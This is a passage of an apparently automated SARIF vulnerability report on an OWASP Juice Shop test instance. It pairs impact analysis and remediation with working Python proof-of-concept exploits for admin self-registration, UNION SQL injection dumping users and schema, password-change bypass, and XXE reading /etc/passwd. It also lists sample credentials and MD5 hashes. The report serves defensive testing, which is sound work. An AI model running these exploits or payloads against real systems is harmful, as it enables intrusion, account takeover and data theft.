                  "endLine": 100,
                  "snippet": {
                    "text": "role: {\n        type: DataTypes.STRING,\n        defaultValue: 'customer',\n        validate: {\n          isIn: [['customer', 'deluxe', 'accounting', 'admin']]\n        },\n        set (role: string) {\n          const profileImage = this.getDataValue('profileImage')\n          if (\n            role === security.roles.admin &&\n          (!profileImage ||\n            profileImage === '/assets/public/images/uploads/default.svg')\n          ) {\n            this.setDataValue(\n              'profileImage',\n              '/assets/public/images/uploads/defaultAdmin.png'\n            )\n          }\n          this.setDataValue('role', role)\n        }\n      },"
                  }
                }
              },
              "message": {
                "text": "User model role field accepts any valid role value without caller authorization check"
              }
            },
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "server.ts"
                },
                "region": {
                  "startLine": 407,
                  "endLine": 421,
                  "snippet": {
                    "text": "app.post('/api/Users', (req: Request, res: Response, next: NextFunction) => {\n    if (req.body.email !== undefined && req.body.password !== undefined && req.body.passwordRepeat !== undefined) {\n      if (req.body.email.length !== 0 && req.body.password.length !== 0) {\n        req.body.email = req.body.email.trim()\n        req.body.password = req.body.password.trim()\n        req.body.passwordRepeat = req.body.passwordRepeat.trim()\n      } else {\n        res.status(400).send(res.__('Invalid email/password cannot be empty'))\n      }\n    }\n    next()\n  })\n  app.post('/api/Users', verify.registerAdminChallenge())\n  app.post('/api/Users', verify.passwordRepeatChallenge()) // vuln-code-snippet hide-end\n  app.post('/api/Users', verify.emptyUserRegistration())"
                  }
                }
              },
              "message": {
                "text": "Registration middleware does not strip protected fields from request body before model creation"
              }
            }
          ],
          "properties": {
            "security-severity": "9.1",
            "strix": {
              "id": "vuln-0010",
              "severity": "critical",
              "cvss": 9.1,
              "timestamp": "2026-05-09 10:59:30 UTC",
              "target": "http://host.docker.internal:3002",
              "endpoint": "/api/Users/",
              "method": "POST",
              "cwe": "CWE-915",
              "impact": "An unauthenticated attacker can create accounts with administrative privileges by including the \"role\" field set to \"admin\" in the registration request. This grants:\n\n- Full administrative access to the application\n- Ability to view and manage all user accounts\n- Ability to modify product catalog, pricing, and descriptions\n- Access to administrative configuration and internal endpoints\n- Complete bypass of the intended role-based access control model\n\nThe vulnerability requires no authentication, making it trivially exploitable by any external attacker.",
              "technical_analysis": "The vulnerability arises from a combination of two architectural issues:\n\n1. The Sequelize User model (models/user.ts, line 80) defines the `role` field as a writable attribute with `type: DataTypes.STRING`, a default of `'customer'`, and a custom setter. The setter accepts any value from the allowed set `['customer', 'deluxe', 'accounting', 'admin']` without checking whether the current request context is authorized to assign elevated roles.\n\n2. The registration route middleware chain (server.ts, lines 407-421) performs email/password validation and challenge verification, but never strips or restricts which fields from `req.body` are passed to the Sequelize model's `create()` method. The underlying REST framework (finale-rest/epilogue) passes the full request body to the ORM, which binds all matching fields including `role`.\n\nAs a result, any JSON key matching a model attribute is persisted, and since `role` is a valid model field, the attacker-supplied value is written directly to the database. The `validate.isIn` constraint only restricts the value to the allowed role set — it does not prevent a non-admin caller from assigning admin privileges.",
              "remediation_steps": "1. Implement an explicit field allowlist for user registration that excludes sensitive fields:\n   - Only permit `email`, `password`, `passwordRepeat`, and `securityQuestion`/`securityAnswer` during self-service registration\n   - Strip or reject any request body fields not in the allowlist (especially `role`, `isActive`, `deluxeToken`)\n\n2. Add server-side enforcement in the registration middleware:\n   - Before passing `req.body` to the model, delete any properties that should not be user-controllable\n   - Example: `delete req.body.role; delete req.body.isActive;`\n\n3. Configure the Sequelize model or ORM layer to distinguish mass-assignable fields from protected fields:\n   - Use a DTO pattern or explicit `fields` option in `Model.create()` to restrict which attributes are set from external input\n\n4. Apply defense-in-depth by checking the caller's role before allowing elevated role assignment on any endpoint that can modify the `role` field.",
              "poc": {
                "description": "To reproduce:\n\n1. Send a POST request to the user registration endpoint with the \"role\" field set to \"admin\" in the JSON body.\n2. Observe that the response confirms the user was created with role=admin.\n3. Authenticate with the newly created account.\n4. Access administrative functionality to confirm elevated privileges.",
                "script": "import requests\nimport json\n\nBASE = \"http://host.docker.internal:3002\"\n\n# Step 1: Register a new user with role=admin (no authentication required)\nregister_resp = requests.post(f\"{BASE}/api/Users/\",\n    headers={\"Content-Type\": \"application/json\"},\n    json={\n        \"email\": \"attacker_privesc@evil.com\",\n        \"password\": \"attackerpass123\",\n        \"role\": \"admin\"\n    })\n\nprint(f\"Registration Status: {register_resp.status_code}\")\nreg_data = register_resp.json()\nprint(f\"Created user role: {reg_data['data']['role']}\")\nassert reg_data[\"data\"][\"role\"] == \"admin\", \"Role escalation failed\"\n\n# Step 2: Login with the new admin account\nlogin_resp = requests.post(f\"{BASE}/rest/user/login\",\n    json={\"email\": \"attacker_privesc@evil.com\", \"password\": \"attackerpass123\"})\ntoken = login_resp.json()[\"authentication\"][\"token\"]\nprint(f\"Login successful, token obtained\")\n\n# Step 3: Verify admin access - list all users (admin-only in intended design)\nusers_resp = requests.get(f\"{BASE}/api/Users/\",\n    headers={\"Authorization\": f\"Bearer {token}\"})\nprint(f\"GET /api/Users/ status: {users_resp.status_code}\")\nprint(f\"Total users exposed: {len(users_resp.json()['data'])}\")\n\n# Step 4: Verify admin access - modify products\nproduct_resp = requests.put(f\"{BASE}/api/Products/1\",\n    headers={\"Authorization\": f\"Bearer {token}\", \"Content-Type\": \"application/json\"},\n    json={\"description\": \"Modified by escalated admin\"})\nprint(f\"PUT /api/Products/1 status: {product_resp.status_code}\")\nprint(\"Privilege escalation to admin confirmed!\")"
              }
            }
          }
        },
        {
          "ruleId": "CWE-89",
          "level": "error",
          "message": {
            "text": "SQL Injection in Product Search Enables Full Database Extraction"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "routes/search.ts"
                },
                "region": {
                  "startLine": 23,
                  "endLine": 23,
                  "snippet": {
                    "text": "models.sequelize.query(`SELECT * FROM Products WHERE ((name LIKE '%${criteria}%' OR description LIKE '%${criteria}%') AND deletedAt IS NULL) ORDER BY name`) // vuln-code-snippet vuln-line unionSqlInjectionChallenge dbSchemaChallenge"
                  }
                }
              },
              "message": {
                "text": "User-supplied search criteria directly interpolated into SQL LIKE clause without parameterization"
              }
            }
          ],
          "properties": {
            "security-severity": "7.5",
            "strix": {
              "id": "vuln-0002",
              "severity": "high",
              "cvss": 7.5,
              "timestamp": "2026-05-09 10:55:53 UTC",
              "target": "http://host.docker.internal:3002",
              "endpoint": "/rest/products/search",
              "method": "GET",
              "cwe": "CWE-89",
              "impact": "Successful exploitation enables full database exfiltration without authentication. An attacker can:\n\n- Extract all user credentials (emails and MD5 password hashes) from the Users table\n- Obtain administrative account details and roles for privilege escalation\n- Retrieve the complete database schema via sqlite_master\n- Access sensitive business data across all application tables (orders, payments, addresses, cards)\n- Enumerate TOTP secrets, potentially bypassing two-factor authentication\n- Extract any data stored in the SQLite database\n\nThe business impact includes full compromise of all user data, regulatory exposure (GDPR/PCI), mass credential theft enabling account takeover attacks, and complete loss of data confidentiality.",
              "technical_analysis": "The vulnerability exists because the search route handler uses JavaScript template literals to construct a raw SQL query, directly interpolating the user-controlled `criteria` value without sanitization.\n\nThe query on line 23 of `routes/search.ts`:\n```sql\nSELECT * FROM Products WHERE ((name LIKE '%${criteria}%' OR description LIKE '%${criteria}%') AND deletedAt IS NULL) ORDER BY name\n```\n\nThe Products table contains 9 columns. An attacker crafts a payload that:\n1. Closes the open LIKE clause and parentheses with `'))`\n2. Appends a UNION SELECT with matching column count\n3. Comments out the trailing SQL with `--`\n\nExample payload extracting the Users table:\n```\n')) UNION SELECT id,email,password,role,totpSecret,'6','7','8','9' FROM Users--\n```\n\nThe resulting query becomes:\n```sql\nSELECT * FROM Products WHERE ((name LIKE '%')) UNION SELECT id,email,password,role,totpSecret,'6','7','8','9' FROM Users--%' OR description LIKE '%...\n```\n\nValidation confirmed extraction of 29 user records including:\n- admin@juice-sh.op with MD5 hash 0192023a7bbd73250516f069df18b500 (role: admin)\n- jim@juice-sh.op with MD5 hash e541ca7ecf72b8d1286474fc613e5e45 (role: customer)\n- Multiple other accounts with emails, password hashes, and role assignments\n\nThe 200-character limit is not a meaningful constraint; the UNION payload fits comfortably within this limit. No authentication is required to exploit this endpoint.",
              "remediation_steps": "1. Replace the raw SQL query with a parameterized query using Sequelize's built-in parameter binding:\n\n```typescript\nmodels.sequelize.query(\n  \"SELECT * FROM Products WHERE ((name LIKE :search OR description LIKE :search) AND deletedAt IS NULL) ORDER BY name\",\n  {\n    replacements: { search: `%${criteria}%` },\n    type: models.sequelize.QueryTypes.SELECT\n  }\n)\n```\n\n2. Alternatively, use Sequelize's ORM methods with the Op.like operator:\n\n```typescript\nconst { Op } = require('sequelize');\nProductModel.findAll({\n  where: {\n    [Op.and]: [\n      {\n        [Op.or]: [\n          { name: { [Op.like]: `%${criteria}%` } },\n          { description: { [Op.like]: `%${criteria}%` } }\n        ]\n      },\n      { deletedAt: null }\n    ]\n  },\n  order: [['name', 'ASC']]\n})\n```\n\n3. Implement strict input validation on the search parameter to reject SQL metacharacters (single quotes, double dashes, UNION keyword, semicolons).\n\n4. Apply the principle of least privilege to the database connection user, restricting access to only the Products table for search operations.\n\n5. Deploy rate limiting on the search endpoint to reduce the effectiveness of automated extraction attempts.",
              "poc": {
                "description": "To reproduce:\n\n1. Send a GET request to /rest/products/search with the q parameter containing a UNION-based SQL injection payload that closes the existing LIKE clause and selects from the Users table.\n2. Observe that the server returns HTTP 200 with a JSON response containing user records (emails, password hashes, roles) alongside or instead of product data.\n3. Verify extracted password hashes match known credentials (e.g., admin hash 0192023a7bbd73250516f069df18b500 is MD5 of \"admin123\").\n\nThe attack requires no authentication and can be performed by any anonymous user.",
                "script": "import requests\nimport json\n\nBASE_URL = \"http://host.docker.internal:3002\"\n\n# Step 1: Confirm column count via ORDER BY\nprint(\"[*] Determining column count...\")\nfor i in range(1, 12):\n    payload = f\"')) ORDER BY {i}--\"\n    resp = requests.get(f\"{BASE_URL}/rest/products/search\", params={\"q\": payload})\n    if resp.status_code != 200:\n        print(f\"[+] Products table has {i-1} columns (ORDER BY {i} failed)\")\n        break\n\n# Step 2: UNION-based extraction of Users table\nprint(\"\\n[*] Extracting Users table via UNION injection...\")\npayload = \"')) UNION SELECT id,email,password,role,totpSecret,'6','7','8','9' FROM Users--\"\nresp = requests.get(f\"{BASE_URL}/rest/products/search\", params={\"q\": payload})\n\nprint(f\"[*] Status Code: {resp.status_code}\")\nif resp.status_code == 200:\n    data = resp.json()\n    results = data.get(\"data\", [])\n    users = [item for item in results if \"@\" in str(item.get(\"name\", \"\"))]\n    print(f\"[+] Successfully extracted {len(users)} user records!\")\n    print(f\"\\n[+] Extracted credentials (id, email, password_hash, role):\")\n    for u in users[:10]:\n        print(f\"    ID={u['id']}, Email={u['name']}, Hash={u['description']}, Role={u['price']}\")\nelse:\n    print(f\"[-] Failed: {resp.text[:200]}\")\n\n# Step 3: Extract database schema\nprint(\"\\n[*] Extracting database schema via sqlite_master...\")\npayload = \"')) UNION SELECT sql,'2','3','4','5','6','7','8','9' FROM sqlite_master WHERE type='table'--\"\nresp = requests.get(f\"{BASE_URL}/rest/products/search\", params={\"q\": payload})\nif resp.status_code == 200:\n    data = resp.json()\n    results = data.get(\"data\", [])\n    schemas = [item for item in results if \"CREATE\" in str(item.get(\"id\", \"\"))]\n    print(f\"[+] Extracted {len(schemas)} table definitions:\")\n    for s in schemas[:5]:\n        print(f\"    {str(s.get('id', ''))[:100]}\")\nelse:\n    print(f\"[-] Schema extraction failed: {resp.status_code}\")"
              }
            }
          }
        },
        {
          "ruleId": "CWE-620",
          "level": "error",
          "message": {
            "text": "Authentication Bypass via Missing Current Password Validation in Password Change"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "routes/changePassword.ts"
                },
                "region": {
                  "startLine": 39,
                  "endLine": 42,
                  "snippet": {
                    "text": "if (currentPassword && security.hash(currentPassword) !== loggedInUser.data.password) {\n      res.status(401).send(res.__('Current password is not correct.'))\n      return\n    }"
                  }
                }
              },
              "message": {
                "text": "Flawed conditional that skips password verification when current parameter is absent"
              }
            }
          ],
          "properties": {
            "security-severity": "8.1",
            "strix": {
              "id": "vuln-0004",
              "severity": "high",
              "cvss": 8.1,
              "timestamp": "2026-05-09 10:57:31 UTC",
              "target": "http://host.docker.internal:3002",
              "endpoint": "/rest/user/change-password",
              "method": "GET",
              "cwe": "CWE-620",
              "impact": "An attacker who obtains any valid session token (e.g., via XSS, session fixation, or network interception) can permanently take over the associated account by changing its password without knowing the current one. Additionally, since the endpoint uses GET with query parameters, it is trivially exploitable via cross-site request forgery—a malicious link or image tag in an email or web page could change a logged-in user's password without any interaction beyond visiting the page.\n\nBusiness impact includes:\n- Complete account takeover for any authenticated user\n- CSRF-based mass password reset if combined with session persistence\n- Loss of user trust and potential regulatory compliance violations",
              "technical_analysis": "The vulnerable code in `routes/changePassword.ts` at line 39:\n\n```typescript\nif (currentPassword && security.hash(currentPassword) !== loggedInUser.data.password) {\n  res.status(401).send(res.__('Current password is not correct.'))\n  return\n}\n```\n\nThe logical flaw is the use of `currentPassword &&` as a guard. JavaScript evaluates `undefined && <anything>` as `undefined` (falsy), which means:\n- If `current` query parameter is omitted entirely: `currentPassword` is `undefined`, the condition short-circuits, and password verification is skipped\n- If `current` is an empty string: same behavior since empty string is falsy\n\nThe subsequent code then updates the password unconditionally (provided `new` and `repeat` match). The endpoint also uses the GET HTTP method with query parameters, making it susceptible to CSRF attacks since no anti-CSRF token is required.\n\nDynamic validation confirmed that calling `GET /rest/user/change-password?new=hacked123&repeat=hacked123` (without the `current` parameter) successfully changed the password, while providing an incorrect `current` parameter correctly returned a 401 error.",
              "remediation_steps": "1. Require the current password parameter unconditionally. Reject the request with 401 if the `current` parameter is missing or empty, regardless of other conditions.\n\n2. Change the HTTP method from GET to POST or PUT. Password change operations are state-changing and must not use GET, which is susceptible to CSRF via link/image tags and is logged in browser history and server access logs.\n\n3. Implement anti-CSRF protections (e.g., synchronizer token pattern or SameSite cookie attribute) on the password change endpoint.\n\n4. Apply rate limiting to prevent brute-force attempts against the current password verification.\n\n5. Consider requiring re-authentication (fresh login) before allowing password changes as an additional defense-in-depth measure.",
              "poc": {
                "description": "To reproduce:\n\n1. Authenticate as any user (e.g., jim@juice-sh.op with password ncc-1701) and obtain a valid JWT token.\n2. Send a GET request to `/rest/user/change-password` with only `new` and `repeat` parameters, omitting the `current` parameter entirely.\n3. Observe that the response is 200 OK and the password has been changed.\n4. Verify by logging in with the new password.\n5. Confirm that providing an incorrect `current` parameter correctly rejects the request with 401, proving the bypass only works when the parameter is absent.",
                "script": "import requests\nimport json\n\nBASE_URL = \"http://host.docker.internal:3002\"\n\n# Step 1: Login as jim to get a valid token\nlogin_resp = requests.post(f\"{BASE_URL}/rest/user/login\",\n    json={\"email\": \"jim@juice-sh.op\", \"password\": \"ncc-1701\"})\ntoken = login_resp.json()[\"authentication\"][\"token\"]\nprint(f\"[+] Obtained token for jim@juice-sh.op\")\n\n# Step 2: Change password WITHOUT providing current password\nheaders = {\"Authorization\": f\"Bearer {token}\", \"Cookie\": f\"token={token}\"}\nchange_resp = requests.get(\n    f\"{BASE_URL}/rest/user/change-password?new=hacked123&repeat=hacked123\",\n    headers=headers)\nprint(f\"[+] Password change (no current): HTTP {change_resp.status_code}\")\nassert change_resp.status_code == 200, \"Password change should succeed\"\n\n# Step 3: Verify login with new password works\nverify_resp = requests.post(f\"{BASE_URL}/rest/user/login\",\n    json={\"email\": \"jim@juice-sh.op\", \"password\": \"hacked123\"})\nprint(f\"[+] Login with new password: HTTP {verify_resp.status_code}\")\nassert verify_resp.status_code == 200, \"Login with new password should succeed\"\n\n# Step 4: Demonstrate that wrong current password IS rejected\ntoken2 = verify_resp.json()[\"authentication\"][\"token\"]\nheaders2 = {\"Authorization\": f\"Bearer {token2}\", \"Cookie\": f\"token={token2}\"}\nfail_resp = requests.get(\n    f\"{BASE_URL}/rest/user/change-password?current=wrongpass&new=x&repeat=x\",\n    headers=headers2)\nprint(f\"[+] Password change (wrong current): HTTP {fail_resp.status_code}\")\nassert fail_resp.status_code == 401, \"Wrong current password should be rejected\"\n\n# Restore original password\nrequests.get(\n    f\"{BASE_URL}/rest/user/change-password?new=ncc-1701&repeat=ncc-1701\",\n    headers=headers2)\nprint(\"[+] Password restored to original\")\nprint(\"\\n[CONFIRMED] Password change bypasses current password when parameter is omitted\")"
              }
            }
          }
        },
        {
          "ruleId": "CWE-611",
          "level": "error",
          "message": {
            "text": "XML External Entity (XXE) Injection via File Upload Endpoint"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "routes/fileUpload.ts"
                },
                "region": {
                  "startLine": 81,
                  "endLine": 83,
                  "snippet": {
                    "text": "const sandbox = { libxml, data }\n      vm.createContext(sandbox)\n      const xmlDoc = vm.runInContext('libxml.parseXml(data, { noblanks: true, noent: true, nocdata: true })', sandbox, { timeout: 2000 })"
                  }
                }
              },
              "message": {
                "text": "XML parser configured with noent:true enabling external entity resolution (sink)"
              }
            },
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "routes/fileUpload.ts"
                },
                "region": {
                  "startLine": 86,
                  "endLine": 87,
                  "snippet": {
                    "text": "res.status(410)\n        next(new Error('B2B customer complaints via file upload have been deprecated for security reasons: ' + utils.trunc(xmlString, 400) + ' (' + file.originalname + ')'))"
                  }
                }
              },
              "message": {
                "text": "Parsed XML content (including resolved entities) reflected in error response enabling exfiltration"
              }
            }
          ],
          "properties": {
            "security-severity": "7.1",
            "strix": {
              "id": "vuln-0006",
              "severity": "high",
              "cvss": 7.1,
              "timestamp": "2026-05-09 10:58:02 UTC",
              "target": "http://host.docker.internal:3002",
              "endpoint": "/file-upload",
              "method": "POST",
              "cwe": "CWE-611",
              "impact": "Successful exploitation enables an attacker to:\n\n- Read arbitrary files from the server filesystem, including /etc/passwd, application configuration files, and cryptographic key material (the JWT public key was confirmed readable).\n- Perform server-side request forgery (SSRF) against internal network services by substituting file:// URIs with http:// or other protocol schemes.\n- Cause denial-of-service through recursive entity expansion (billion laughs attack), which the application partially mitigates with a 2-second execution timeout.\n- Exfiltrate sensitive application data including database credentials, API keys, and environment variables accessible to the application process.\n\nThe attack requires only valid authentication (any registered user account) and directly compromises server-side confidentiality.",
              "technical_analysis": "The vulnerable code resides in routes/fileUpload.ts within the `handleXmlUpload` function. When a file with a `.xml` extension is uploaded, the following execution path is triggered:\n\n1. The file buffer is converted to a string (line 79)\n2. A sandboxed VM context is created with libxmljs2 and the data (line 81-82)\n3. The XML is parsed with dangerous options: `libxml.parseXml(data, { noblanks: true, noent: true, nocdata: true })` (line 83)\n4. The `noent: true` option instructs the parser to resolve external entities, including SYSTEM entities referencing file:// and http:// URIs\n5. The parsed XML document is stringified and reflected in the error response (line 87): the entity-resolved content is included verbatim in an HTTP 410 error message\n\nThe response truncation via `utils.trunc(xmlString, 400)` limits exfiltration to approximately 400 characters per request, but repeated requests with different target files allow complete data extraction.\n\nFiles confirmed readable:\n- /etc/passwd (user accounts)\n- /etc/os-release (OS identification: Debian GNU/Linux 13 \"trixie\" distroless)\n- /juice-shop/encryptionkeys/jwt.pub (RSA public key used for JWT verification)",
              "remediation_steps": "1. Disable external entity resolution in the XML parser by removing the `noent: true` option from the libxmljs2 parseXml call. The secure configuration should be:\n   ```javascript\n   libxml.parseXml(data, { noblanks: true, noent: false, nocdata: true, nonet: true })\n   ```\n\n2. Add the `nonet: true` option to prevent the XML parser from making any network connections, blocking SSRF via XXE.\n\n3. Implement strict file type validation that rejects XML uploads entirely if XML processing is not a business requirement for the complaint submission workflow.\n\n4. If XML processing is required, use a defused XML parser or configure the parser to disable all external entity resolution, DTD processing, and XInclude support.\n\n5. Remove the reflection of parsed XML content in error responses to eliminate the direct exfiltration channel even if entity resolution cannot be fully disabled.",
              "poc": {
                "description": "To reproduce the vulnerability:\n\n1. Authenticate to the application to obtain a valid JWT token (e.g., POST /rest/user/login with valid credentials).\n2. Craft an XML file containing a DOCTYPE declaration with an external SYSTEM entity pointing to a target file.\n3. Upload the XML file to POST /file-upload as a multipart form upload with the field name \"file\".\n4. Observe that the HTTP 410 response contains the resolved entity content (i.e., the target file's contents) embedded in the error message.\n\nExample payload to read /etc/passwd:\n```xml\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>\n<stockCheck><productId>&xxe;</productId></stockCheck>\n```\n\nThe server responds with the file contents substituted in place of the &xxe; entity reference within the reflected XML string in the error body.",
                "script": "import requests\nimport html\n\nBASE_URL = \"http://host.docker.internal:3002\"\n\n# Step 1: Authenticate\nlogin_resp = requests.post(\n    f\"{BASE_URL}/rest/user/login\",\n    json={\"email\": \"admin@juice-sh.op\", \"password\": \"admin123\"}\n)\ntoken = login_resp.json()[\"authentication\"][\"token\"]\n\n# Step 2: Craft XXE payload to read /etc/passwd\nxxe_payload = '''<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>\n<stockCheck><productId>&xxe;</productId></stockCheck>'''\n\n# Step 3: Upload malicious XML\nheaders = {\"Authorization\": f\"Bearer {token}\", \"Cookie\": f\"token={token}\"}\nfiles = {\"file\": (\"exploit.xml\", xxe_payload.encode(), \"application/xml\")}\nresp = requests.post(f\"{BASE_URL}/file-upload\", headers=headers, files=files)\n\n# Step 4: Extract exfiltrated content\nassert resp.status_code == 410, f\"Unexpected status: {resp.status_code}\"\ndecoded = html.unescape(resp.text)\nassert \"<productId>\" in decoded, \"Entity not resolved\"\nstart = decoded.index(\"<productId>\") + len(\"<productId>\")\nend = decoded.index(\"</productId>\")\nfile_content = decoded[start:end]\n\nprint(f\"[+] XXE Successful - Status: {resp.status_code}\")\nprint(f\"[+] Exfiltrated /etc/passwd:\")\nprint(file_content)\nassert \"root:\" in file_content, \"File content not present\"\n\n# Also demonstrate reading the JWT public key\nxxe_jwt = '''<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///juice-shop/encryptionkeys/jwt.pub\">]>\n<data><content>&xxe;</content></data>'''\n\nfiles2 = {\"file\": (\"jwt_read.xml\", xxe_jwt.encode(), \"application/xml\")}\nresp2 = requests.post(f\"{BASE_URL}/file-upload\", headers=headers, files=files2)\ndecoded2 = html.unescape(resp2.text)\nassert \"BEGIN RSA PUBLIC KEY\" in decoded2, \"JWT key not readable\"\nprint(f\"\\n[+] JWT Public Key also exfiltrated successfully\")\nprint(f\"[+] Key material confirmed in response\")"
              }
            }
          }
        },
        {
          "ruleId": "CWE-916",
          "level": "error",
          "message": {
            "text": "Insecure Password Storage Using Unsalted MD5 Hashing"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "lib/insecurity.ts"
                },
                "region": {
                  "startLine": 43,
                  "endLine": 43,
                  "snippet": {
                    "text": "export const hash = (data: string) => crypto.createHash('md5').update(data).digest('hex')"
                  }
                }
              },
              "message": {
                "text": "MD5 hash function without salt used for all password storage"
              }
            }
          ],
          "properties": {
            "security-severity": "8.1",
            "strix": {
              "id": "vuln-0007",
              "severity": "high",
              "cvss": 8.1,
              "timestamp": "2026-05-09 10:58:12 UTC",
              "target": "http://host.docker.internal:3002",
              "endpoint": "/api/Users/",
              "method": "POST",
              "cwe": "CWE-916",
              "impact": "The use of unsalted MD5 for password storage exposes the entire user base to efficient offline credential compromise:\n\n- Rainbow table attacks can reverse any MD5 hash in seconds using precomputed tables\n- Identical passwords across users produce identical hashes, enabling batch cracking\n- MD5 computation is extremely fast on modern hardware (billions of hashes per second on GPUs), making brute-force trivial\n- Password hashes are additionally leaked in JWT token payloads, meaning any intercepted token reveals the password hash\n\nIn a breach scenario, an attacker with database access (or token interception capability) could recover plaintext passwords for the majority of users within minutes, enabling mass account compromise across this and other services where users reuse passwords.",
              "technical_analysis": "The vulnerable hashing function in `lib/insecurity.ts` at line 43:\n\n```typescript\nexport const hash = (data: string) => crypto.createHash('md5').update(data).digest('hex')\n```\n\nThis function is used throughout the application for password hashing during registration, login verification, and password changes. The implementation has multiple cryptographic weaknesses:\n\n1. **MD5 algorithm**: Computationally broken with known collision attacks (CVE-2004-2761). GPU-accelerated cracking tools like Hashcat achieve billions of MD5 hashes per second.\n\n2. **No salt**: Without a per-user random salt, identical passwords always produce the same hash. This enables precomputed rainbow table attacks and allows an attacker to identify users sharing the same password.\n\n3. **Single iteration**: No key stretching or iteration count, meaning the cost of brute-force is minimal.\n\n4. **Hash exposure in JWT**: The password hash is included in the JWT token payload (the `data.password` field), making it accessible to anyone who intercepts or decodes a token.\n\nDynamic verification confirmed hash matches:\n- MD5(\"admin123\") = 0192023a7bbd73250516f069df18b500 (matches admin account)\n- MD5(\"ncc-1701\") = e541ca7ecf72b8d1286474fc613e5e45 (matches jim account)\n- MD5(\"OhG0dPlease1nsertLiquor!\") = 0c36e517e3fa95aabf1bbffc6744a4ef (matches bender account)\n- MD5(\"TestPassword123\") = 9b599faac222a0dfcfab49148ce40c26 (matches newly registered account)",
              "remediation_steps": "1. Replace MD5 with a modern password hashing algorithm designed for credential storage, such as bcrypt, scrypt, or Argon2id. These algorithms incorporate per-hash salts and configurable work factors that make brute-force computationally expensive.\n\n2. Implement automatic migration of existing password hashes. On successful login with the old MD5 hash, re-hash the password with the new algorithm and update the stored value.\n\n3. Remove password hashes from JWT token payloads. Authentication tokens should never contain sensitive credential material. Include only the minimum claims necessary for authorization (user ID, role, expiration).\n\n4. Configure an appropriate work factor for the chosen algorithm (e.g., bcrypt cost factor of 12 or higher) that balances security with acceptable login latency.\n\n5. Implement monitoring for credential stuffing attacks, and consider offering users the option to check their passwords against known breach databases (e.g., Have I Been Pwned).",
              "poc": {
                "description": "To reproduce:\n\n1. Register a new user account or use existing credentials (e.g., admin@juice-sh.op / admin123).\n2. Authenticate via POST /rest/user/login to obtain a JWT token.\n3. Decode the JWT token payload (base64) to extract the `data.password` field.\n4. Compute MD5 of the known plaintext password.\n5. Observe that the computed MD5 hash matches the stored hash exactly, confirming unsalted MD5 is used.\n6. Repeat for multiple accounts to confirm no per-user salt is applied (identical passwords would produce identical hashes).",
                "script": "import requests\nimport hashlib\nimport base64\nimport json\n\nBASE_URL = \"http://host.docker.internal:3002\"\n\n# Test accounts with known passwords\ntest_cases = [\n    (\"admin@juice-sh.op\", \"admin123\"),\n    (\"jim@juice-sh.op\", \"ncc-1701\"),\n    (\"bender@juice-sh.op\", \"OhG0dPlease1nsertLiquor!\"),\n]\n\nprint(\"Verifying unsalted MD5 password storage:\\n\")\nprint(f\"{'Email':<30} {'Expected MD5':<35} {'Stored Hash':<35} {'Match'}\")\nprint(\"-\" * 135)\n\nfor email, password in test_cases:\n    # Login to get token\n    resp = requests.post(f\"{BASE_URL}/rest/user/login\",\n        json={\"email\": email, \"password\": password})\n    \n    if resp.status_code != 200:\n        print(f\"{email:<30} LOGIN FAILED\")\n        continue\n    \n    token = resp.json()[\"authentication\"][\"token\"]\n    \n    # Decode JWT payload to get stored hash\n    payload_b64 = token.split(\".\")[1]\n    payload_b64 += \"=\" * (4 - len(payload_b64) % 4)\n    payload = json.loads(base64.b64decode(payload_b64))\n    stored_hash = payload[\"data\"][\"password\"]\n    \n    # Compute expected MD5\n    expected_md5 = hashlib.md5(password.encode()).hexdigest()\n    \n    match = stored_hash == expected_md5\n    print(f\"{email:<30} {expected_md5:<35} {stored_hash:<35} {match}\")\n\nprint(\"\\n[CONFIRMED] All passwords are stored as unsalted MD5 hashes\")\nprint(\"[CONFIRMED] Password hashes are exposed in JWT token payloads\")"
              }
            }
          }
        },
        {
          "ruleId": "CWE-918",
          "level": "error",
          "message": {
            "text": "Server-Side Request Forgery via Profile Image URL Upload"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "routes/profileImageUrlUpload.ts"
                },
                "region": {
                  "startLine": 18,
                  "endLine": 30,
                  "snippet": {
                    "text": "if (req.body.imageUrl !== undefined) {\n      const url = req.body.imageUrl\n      if (url.match(/(.)*solve\\/challenges\\/server-side(.)*/) !== null) req.app.locals.abused_ssrf_bug = true\n      const loggedInUser = security.authenticatedUsers.get(req.cookies.token)\n      if (loggedInUser) {\n        try {\n          const response = await fetch(url)\n          if (!response.ok || !response.body) {\n            throw new Error('url returned a non-OK status code or an empty body')\n          }\n          const ext = ['jpg', 'jpeg', 'png', 'svg', 'gif'].includes(url.split('.').slice(-1)[0].toLowerCase()) ? url.split('.').slice(-1)[0].toLowerCase() : 'jpg'\n          const fileStream = fs.createWriteStream(`frontend/dist/frontend/assets/public/images/uploads/${loggedInUser.data.id}.${ext}`, { flags: 'w' })\n          await finished(Readable.fromWeb(response.body as any).pipe(fileStream))"
                  }
                }
              },
              "message": {
                "text": "Unvalidated user-supplied URL passed directly to server-side fetch (primary sink)"
              }
            },
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "routes/profileImageUrlUpload.ts"
                },
                "region": {
                  "startLine": 33,
                  "endLine": 41,
                  "snippet": {
                    "text": "} catch (error) {\n          try {\n            const user = await UserModel.findByPk(loggedInUser.data.id)\n            await user?.update({ profileImage: url })\n            logger.warn(`Error retrieving user profile image: ${utils.getErrorMessage(error)}; using image link directly`)\n          } catch (error) {\n            next(error)\n            return\n          }"
                  }
                }
              },
              "message": {
                "text": "Catch handler stores raw user-supplied URL in database without sanitization (secondary sink)"
              }
            }
          ],
          "properties": {
            "security-severity": "8.5",
            "strix": {
              "id": "vuln-0009",
              "severity": "high",
              "cvss": 8.5,
              "timestamp": "2026-05-09 10:58:57 UTC",
              "target": "http://host.docker.internal:3002",
              "endpoint": "/profile/image/url",
